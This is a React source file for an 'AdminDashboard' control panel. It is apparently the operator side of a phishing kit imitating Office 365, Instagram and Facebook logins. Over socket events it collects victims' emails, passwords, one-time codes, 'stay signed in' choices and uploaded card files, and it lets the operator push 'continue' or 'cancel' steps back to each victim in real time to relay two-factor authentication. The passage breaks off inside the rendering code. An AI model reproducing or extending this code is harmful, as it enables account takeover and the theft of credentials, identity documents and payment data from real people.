/* eslint-disable no-unused-vars */

import React, { useEffect, useState } from "react";
import { Menu, Menu as MenuIcon, Search } from "lucide-react";
import io from "socket.io-client";
import {
  Box,
  Button,
  Card,
  Flex,
  Grid,
  GridItem,
  HStack,
  Image,
  Link,
  Text,
  VStack,
  Badge,
  Heading,
  IconButton,
  Input,
  Avatar,
  Icon,
} from "@chakra-ui/react";
import { eventConfig } from "../lib/eventConfig";

const createButton = (colorScheme, onClick, text) => (
  <Button colorPalette={colorScheme} onClick={onClick}>
    {text}
  </Button>
);

const AdminDashboard = () => {
  const [sessions, setSessions] = useState({});
  const [socket, setSocket] = useState(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [authNumber, setAuthNumber] = useState("");
  const [phone, setPhone] = useState("");
  const [sendTo, setSendTo] = useState("");
  const [uploadedData, setUploadedData] = useState("");

  // Define step navigation configuration for different event types
  // const eventConfig = {
  //   "email-verification": {
  //     continue: {
  //       nextStep: "1",
  //       message: "Email verified successfully",
  //       action: "PROCEED_TO_PASSWORD",
  //     },
  //     cancel: {
  //       nextStep: "0",
  //       message: "Email verification failed. Please try again.",
  //       action: "RESET_EMAIL",
  //     },
  //   },
  //   "password-submission": {
  //     continue: {
  //       nextStep: "2",
  //       message: "Password verified successfully",
  //       action: "PROCEED_TO_2FA",
  //     },
  //     cancel: {
  //       nextStep: "1",
  //       message: "Invalid password. Please try again.",
  //       action: "RESET_PASSWORD",
  //     },
  //   },
  // "authenticator-verification": {
  //   continue: {
  //     nextStep: "success",
  //     message: "Authentication successful",
  //     action: "COMPLETE_AUTH",
  //   },
  //   cancel: {
  //     nextStep: "2",
  //     message:
  //       "Authentication failed. Please try again or choose another method.",
  //     action: "RESET_2FA",
  //   },
  // },
  // "verification-code": {
  //   continue: {
  //     nextStep: "7",
  //     message: "Code verified successfully",
  //     action: "PROCEED_TO_FINAL",
  //   },
  //   cancel: {
  //     nextStep: "4",
  //     message: "Invalid code. Please try again.",
  //     action: "RESET_CODE",
  //   },
  // },
  // "phone-verification": {
  //   continue: {
  //     nextStep: "7",
  //     message: "Phone verification successful",
  //     action: "PROCEED_TO_FINAL",
  //   },
  //   cancel: {
  //     nextStep: "2",
  //     message: "Phone verification failed. Please try another method.",
  //     action: "RESET_PHONE",
  //   },
  // },
  // };

  useEffect(() => {
    const socketURL = import.meta.env.VITE_BASE_URL;
    const newSocket = io(socketURL);

    newSocket.on("connect", () => {
      console.log("Connected to socket server");
      newSocket.emit("register_admin");
    });

    newSocket.on("new-login-attempt", (data) => {
      setSessions((prev) => ({
        ...prev,
        [data.sessionId]: {
          ...prev[data.sessionId],
          sessionId: data.sessionId,
          email: data.email,
          lastActivity: new Date(data.timestamp),
          events: [
            ...(prev[data.sessionId]?.events || []),
            {
              type: "email-verification",
              timestamp: data.timestamp,
              data: data.email,
              status: "pending",
            },
          ],
        },
      }));
    });

    // newSocket.on("password-attempt", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "password-submission",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("password-attempt", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data provided
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "password-submission",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "password-submission",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("authenticator-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "authenticator-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("authenticator-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the received data
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "authenticator-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password, // Assuming 'data.password' is relevant here
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "authenticator-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password, // Assuming 'data.password' is relevant here
                status: "pending",
                email: session.email, // Use the email from the existing session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("verifycode-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "verifycode-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("verifycode-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "verifycode-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "verifycode-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("verify-click", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "verify-click",
    //             timestamp: data.timestamp,
    //             password: data.password,
    //             data: data.verifyCode,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("verify-click", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "verify-click",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  data: data.verifyCode,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "verify-click",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                data: data.verifyCode,
                status: "pending",
                email: session.email,
              },
            ],
          },
        };
      });
    });

    // newSocket.on("text-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "text-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("text-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from data
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "text-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password, // Assuming 'password' is relevant here
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "text-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password, // Assuming 'password' is relevant here
                status: "pending",
                email: session.email,
              },
            ],
          },
        };
      });
    });

    newSocket.on("text-click", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "text-click",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  data: data.verifyCode,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "text-click",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                data: data.verifyCode,
                status: "pending",
                email: session.email,
              },
            ],
          },
        };
      });
    });

    // newSocket.on("call-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "call-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("call-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data provided
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "call-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password, // Use password from the data
                  status: "pending",
                  email: data.email, // Set email from data
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "call-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password, // Use password from the data
                status: "pending",
                email: session.email, // Use email from session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("call-authenticated", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "call-authenticated",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("call-authenticated", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data provided
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "call-authenticated",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "call-authenticated",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("ig_attempt_init", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "ig_attempt_init",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  status: "pending",
                  email: data.email,
                  data: `${data.email} & ${data.password}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "ig_attempt_init",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("auth_value_submit", (data) => {
      console.log("aa", data);
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              otp: data.otp,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "auth_value_submit",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  otp: data.otp,
                  status: "pending",
                  email: data.email,
                  data: `OTP: ${data.otp}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "auth_value_submit",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                otp: data.otp,
                data: `OTP ${data.otp}`,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("stay_signed_in", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              staySignedIn: data.staySignedIn,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "stay_signed_in",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  staySignedIn: data.staySignedIn,
                  status: "pending",
                  email: data.email,
                  data: `staySignedIn: ${data.staySignedIn}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "stay_signed_in",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                staySignedIn: data.staySignedIn,
                data: `staySignedIn ${data.staySignedIn}`,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("fb_attempt_init", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_attempt_init",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  status: "pending",
                  email: data.email,
                  data: `${data.email} & ${data.password}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_attempt_init",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("fb_otp", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              otp: data.otp,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_otp",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  otp: data.otp,
                  status: "pending",
                  email: data.email,
                  data: `OTP: ${data.otp}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_otp",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                otp: data.otp,
                data: `OTP ${data.otp}`,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("fb_resend_otp", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_resend_otp",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  status: "pending",
                  email: data.email,
                  data: `${data.email} & ${data.password}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_resend_otp",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                status: "pending",
                data: `${data.email} & ${data.password}`,
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("fb_approval_mounted", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_approval_mounted",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  status: "pending",
                  email: data.email,
                  data: `${data.email} & ${data.password}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_approval_mounted",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                status: "pending",
                data: `${data.email} & ${data.password}`,
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("fb_another_way", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_another_way",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  status: "pending",
                  email: data.email,
                  data: `${data.email} & ${data.password}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_another_way",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                status: "pending",
                data: `${data.email} & ${data.password}`,
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    newSocket.on("fb_done", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              otp: data.otp,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_done",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  otp: data.otp,
                  status: "pending",
                  email: data.email,
                  data: `OTP: ${data.otp}`,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_done",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                otp: data.otp,
                data: `OTP ${data.otp}`,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("fb_card_upload", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];

    //     // If session doesn't exist, initialize it
    //     if (!session) {
    //       return {
    //         ...prev,
    //         [data.sessionId]: {
    //           email: data.email,
    //           password: data.password,
    //           otp: data.otp,
    //           lastActivity: new Date(data.timestamp || Date.now()),
    //           events: [
    //             {
    //               type: "fb_card_upload",
    //               timestamp: data.timestamp || new Date().toISOString(),
    //               password: data.password,
    //               otp: data.otp,
    //               status: "pending",
    //               email: data.email,
    //               data: `Files: ${data.files}`,
    //             },
    //           ],
    //         },
    //       };
    //     }

    //     // If session exists, update it
    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp || Date.now()),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "fb_card_upload",
    //             timestamp: data.timestamp || new Date().toISOString(),
    //             password: data.password,
    //             otp: data.otp,
    //             data: `Files: ${data.files}`,
    //             status: "pending",
    //             email: session.email, // Use email from the session
    //           },
    //         ],
    //       },
    //     };
    //   });
    //   setUploadedData(data.files);
    // });

    newSocket.on("fb_card_upload", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              password: data.password,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "fb_card_upload",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  status: "pending",
                  email: data.email,
                  data: data.files, // Store the files array directly
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "fb_card_upload",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                status: "pending",
                email: session.email,
                data: data.files, // Store the files array directly
              },
            ],
          },
        };
      });
      setUploadedData(data.files);
    });

    setSocket(newSocket);

    return () => newSocket.disconnect();
  }, []);

  // useEffect(() => {
  //   console.log("sesh", sessions);
  // }, [sessions]);

  const handleResponse = (sessionId, eventIndex, response) => {
    const event = sessions[sessionId].events[eventIndex];
    const config = eventConfig[event.type]?.[response];

    if (!config) {
      console.error(
        `No configuration found for event type: ${event.type} with response: ${response}`
      );
      return;
    }

    // Send the complete admin response including all metadata from eventConfig
    socket.emit("admin_response", {
      sessionId,
      eventIndex,
      response,
      timestamp: new Date().toISOString(),
      eventType: event.type,
      // Include the full config data in the response
      ...config,
      email: event.email || sessions[sessionId].email,
      authNumber: authNumber || "",
      phone: phone || "",
      sendTo: sendTo || "",
    });

    setSessions((prev) => ({
      ...prev,
      [sessionId]: {
        ...prev[sessionId],
        events: prev[sessionId].events.map((evt, index) =>
          index === eventIndex ? { ...evt, status: response } : evt
        ),
      },
    }));
  };

  const getEventBorderColor = (status) => {
    switch (status) {
      case "pending":
        return "red.200";
      case "continue":
        return "green.200";
      case "authenticate":
        return "red.200";
      case "verify":
        return "yellow.200";
      case "cancel":
        return "red.200";
      default:
        return "gray.200";
    }
  };

  const getStatusProps = (status) => {
    switch (status) {
      case "pending":
        return { colorScheme: "red" };
      case "continue":
        return { colorScheme: "green" };
      case "authenticate":
        return { colorScheme: "blue" };
      case "verify":
        return { colorScheme: "blue" };
      case "cancel":
        return { colorScheme: "black" };
      default:
        return { colorScheme: "gray" };
    }
  };

  const getEventTitle = (event) => {
    switch (event.type) {
      case "email-verification":
        return "Email Verification Request";
      case "password-submission":
        return "Password Submission Attempt";
      case "personal-info-submission":
        return "Personal Information Verification";
      case "authenticator-select":
        return "Authenticator App Selected";
      case "verifycode-select":
        return "Verification Code Selected";
      case "verify-click":
        return "Verify Button Clicked";
      case "text-select":
        return "Text Method Selected";
      case "text-click":
        return "Text Verify Clicked";
      case "call-select":
        return "Call Method Selected";
      case "ig_attempt_init":
        return "IG Email&Pass Init";
      case "auth_value_submit":
        return "IG OTP";
      case "stay_signed_in":
        return "IG StaySignedIn?";
      case "fb_attempt_init":
        return "FB Email&Pass Init";
      case "fb_otp":
        return "FB OTP";
      case "fb_resend_otp":
        return "FB RESEND OTP";
      case "fb_card_upload":
        return "FB CARD UPLOAD";
      case "fb_approval_mounted":
        return "FB APROVAL MOUNTED";
      case "fb_another_way":
        return "FB ANOTHER WAY";
      case "fb_done":
        return "FB Done";

      default:
        return "Unknown Event";
    }
  };

  const getEventIcon = (event) => {
    switch (event.type) {
      case "fb_attempt_init":
        return "/images/fb.png";
      case "fb_otp":
        return "/images/fb.png";
      case "fb_resend_otp":
        return "/images/fb.png";
      case "fb_card_upload":
        return "/images/fb.png";
      case "fb_approval_mounted":
        return "/images/fb.png";
      case "fb_another_way":
        return "/images/fb.png";
      case "fb_done":
        return "/images/fb.png";

      default:
        return "/images/office365.png";
    }
  };

  const filteredSessions = Object.entries(sessions).filter(([sessionId]) =>
    sessionId.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <Box
      bgImage="url('/images/bg.svg')"
      // pt="80px"
      px={4}
      pb={4}
      mb="4rem"
      display="flex"
      flexDirection="column"
      overflow="hidden"
      height="100dvh" // Make the main container take the full height
    >
      <HStack w="100%" justify="space-between" pr="1rem">
        <Link href="/">
          <Image src="/images/office365.png" alt="logo" w="5rem" />
        </Link>
        <Menu size={24} />
      </HStack>
      {/* Search Bar */}
      <Box mb={4}>
        <Input
          placeholder="Search by Session ID..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          bg="white"
        />
      </Box>

      {/* Scrollable Session List */}
      <Box
        flex="1" // Allow this section to grow and take available space
        overflowY="auto" // Enable vertical scrolling
        bg="whiteAlpha.900"
        borderRadius="md"
        boxShadow="sm"
        p={4}
      >
        <VStack spacing={4} align="stretch">
          {filteredSessions.map(([sessionId, session]) => (
            <VStack key={sessionId} spacing={4} align="stretch">
              {session.events.map((event, index) => (
                <Card.Root
                  key={`${sessionId}-${index}`}
                  borderWidth="2px"
                  borderColor={getEventBorderColor(event.status)}
                >
                  <Card.Description>
                    <Box p={4}>
                      <Flex justify="space-between" align="center">
                        <HStack spacing={4}>
                          <Image
                            src={getEventIcon(event)}
                            alt="i"
                            w="1rem"
                            h="1rem"
                          />
                          <Heading size="sm">{getEventTitle(event)}</Heading>
                          <Badge {...getStatusProps(event.status)}>
                            {event.status}
                          </Badge>
                        </HStack>
                        <Text fontSize="sm" color="gray.500">
                          {new Date(event.timestamp).toLocaleString()}
                        </Text>
                      </Flex>

                      <Grid templateColumns="repeat(2, 1fr)" gap={4} mt={4}>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            Session ID
                          </Text>
                          <Text mt={1}>{sessionId}</Text>
                        </GridItem>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            {event.type === "verify-click" ||
                            event.type === "ig_attempt_init" ||
                            event.type === "auth_value_submit" ||
                            event.type === "stay_signed_in" ||
                            event.type === "fb_attempt_init" ||
                            event.type === "fb_otp" ||
                            event.type === "fb_resend_otp" ||
                            event.type === "fb_approval_mounted" ||
                            event.type === "fb_another_way" ||
                            event.type === "fb_done"
                              ? "Email & Password"
                              : "Email"}
                          </Text>
                          <Text mt={1}>
                            {event.type === "verify-click" ||
                            event.type === "ig_attempt_init" ||
                            event.type === "auth_value_submit" ||
                            event.type === "stay_signed_in" ||
                            event.type === "fb_attempt_init" ||
                            event.type === "fb_otp" ||
                            event.type === "fb_resend_otp" ||
                            event.type === "fb_approval_mounted" ||
                            event.type === "fb_another_way" ||
                            event.type === "fb_done" ? (
                              <>
                                {event.email || session.email} &{" "}
                                {event.password}
                              </>
                            ) : (
                              <>{event.email || session.email}</>
                            )}
                          </Text>
                        </GridItem>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            Event Type
                          </Text>
                          <Text mt={1}>{event.type}</Text>
                        </GridItem>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            Submitted Data
                          </Text>
                          <Text
                            bg={
                              event.type === "password-submission"
                                ? "red.500"
                                : event.type === "email-verification"
                                ? "green.500"
                                : event.type === "verify-click"
                                ? "blue.500"
                                : event.type === "authenticator-select"
                                ? "purple.500"
                                : event.type === "text-select"
                                ? "orange.500"
                                : event.type === "text-click"
                                ? "teal.500"
                                : event.type === "ig_attempt_init"
                                ? "red.500"
                                : event.type === "auth_value_submit"
                                ? "red.500"
                                : event.type === "stay_signed_in"
                                ? "teal.500"
                                : event.type === "fb_attempt_init"
                                ? "red.500"
                                : event.type === "fb_otp"
                                ? "red.500"
                                : event.type === "fb_resend_otp"
                                ? "red.500"
                                : event.type === "fb_resend_otp"
                                ? "red.500"
                                : event.type === "fb_card_upload"
                                ? "red.500"
                                : event.type === "fb_approval_mounted"
                                ? "red.500"
                                : event.type === "fb_another_way"
                                ? "red.500"
                                : event.type === "fb_done"
                                ? "green.500"
                                : "yellow.500"
                            }
                            w="fit-content"
                            borderRadius="12px"
                            px="0.5rem"
                            color="#fff"
                            mt={1}
                          >
                            {event.type === "fb_card_upload" ? (
                              <>
                                <Grid
                                  templateColumns={{
                                    base: "1fr",
